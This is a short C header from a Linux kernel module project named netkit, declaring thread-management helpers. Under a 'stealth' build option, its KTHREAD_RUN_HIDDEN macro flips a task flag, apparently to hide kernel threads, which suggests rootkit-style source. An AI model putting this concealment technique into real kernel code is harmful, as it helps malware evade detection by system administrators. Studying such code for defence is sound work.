#ifndef SYS__TASK_H
#define SYS__TASK_H

#include <linux/types.h>
#include <linux/version.h>

#include "../netkit.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 14, 0)
    #define TASK_STATE(task) ((task)->__state)
#else
    #define TASK_STATE(task) ((task)->state)
#endif

int kthread_stop_by_name(const char *name);
int module_stop(void* data);

#if CONFIG_NETKIT_STEALTH
#define KTHREAD_RUN_HIDDEN(...) ({ \
	struct task_struct *task; \
\
	task = kthread_run(__VA_ARGS__); \
	task->flags ^= 0x10000000; \
\
	task; \
})
#else
#define KTHREAD_RUN_HIDDEN(...) kthread_run(__VA_ARGS__);
#endif

#endif